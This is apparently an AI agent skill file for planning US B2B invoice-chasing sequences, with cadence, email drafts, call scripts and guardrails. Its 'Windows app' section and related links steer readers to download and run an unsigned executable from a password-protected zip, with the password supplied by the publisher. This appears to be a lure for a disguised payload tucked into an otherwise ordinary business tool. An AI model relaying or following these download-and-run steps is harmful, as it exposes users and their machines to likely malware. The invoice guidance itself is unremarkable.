---
name: invoice-chasing-sequence
description: Plans a US B2B invoice follow-up cadence over 30, 60 and 90 days, with the email drafts, call script and dispute path for each touch. Use when the user asks for invoice chasing sequence, accounts receivable follow up emails, dunning letter template. For US B2B service firms, agencies, trades and wholesale sellers.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Invoice Chasing Sequence

**Plans a US B2B invoice follow-up cadence over 30, 60 and 90 days, with the email drafts, call script and dispute path for each touch.** Written for US B2B service firms, agencies, trades and wholesale sellers.

Use this skill when someone asks for:

- invoice chasing sequence
- accounts receivable follow up emails
- dunning letter template
- net 30 past due reminder

---

## The job

Collections get handled by whoever answers the phone, so the same invoice is chased awkwardly six times and a good customer gets irritated.

## What you get

1. Read the invoice list: customer, invoice number, amount, issue date, due date, terms and the last contact date.
2. Bucket the invoices by days past due and by balance size.
3. Build the touch cadence: courtesy note, due date reminder, overdue notice, escalation call, final notice.
4. Draft each touch with the invoice number, amount and due date, and leave the payment instruction line for the user to paste.

Output contract:

- cadence_plan - a dated plan per invoice with the touch type, the channel and the owner
- email_drafts - one ready-to-send draft per touch with the payment line left as a placeholder
- call_script - the short version for a phone follow-up
- dispute_path - what to do when the customer says the invoice is wrong
- hold_list - the invoices where the business has decided to wait

## US specifics that matter

- Net 15, Net 30 and Net 45 terms come from the signed agreement, and many US contracts also set a late fee and a clause about collection costs.
- Unpaid sales of goods are usually governed by state UCC Article 2, while service invoices are governed by the contract itself.
- An ACH payment typically settles in 1 to 3 business days, so a reminder should allow for that before the next touch.
- B2B invoice collection is a contractual matter; consumer debt collection is a different legal regime, and this skill is built for business invoices.

## Guardrails (hard rules)

- Never send the reminders; the user sends them from their own email.
- Never threaten litigation, garnishment, a credit report or a lien unless the user's attorney wrote that language.
- Never include another customer's information, and never use a consumer balance for a business account.
- Never offer a discount, a payment plan or a write-off without the owner's approval.

## Quickstart

### 1. Fill in the brief

`templates/ar-worklist.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_collection_plan.py --input ar-worklist.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/ar-collection.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Before you chase**

- Confirm the contract terms, the invoice date and the due date.
- Confirm the goods or services were accepted before escalating.
- Check whether the customer has already raised a dispute.
- Confirm the remittance method the customer actually uses.
- Check the late fee clause in the signed agreement before you cite one.

**Tone that works on B2B accounts**

- Put the invoice number and the amount in the first line.
- Ask a specific question instead of demanding payment.
- Offer a payment plan only if the business has approved one in writing.
- Keep the relationship intact where the balance is recoverable.
- Note that a supplier relationship is often worth more than the balance.

**Escalation reality**

- Handing a balance to a collections agency or a lawyer is a business decision with a cost attached.
- Preserve the contract, the invoices and the delivery proof before anything escalates.
- Keep the aging report current so the write-off decision happens with data.
- Consumer balances follow the FDCPA; this skill is for business-to-business invoices only.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/ar-collection.md` - US receivables and dunning rules
- `templates/ar-worklist.yaml` - the brief to fill in
- `scripts/build_collection_plan.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_collection_plan.py --input ar-worklist.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
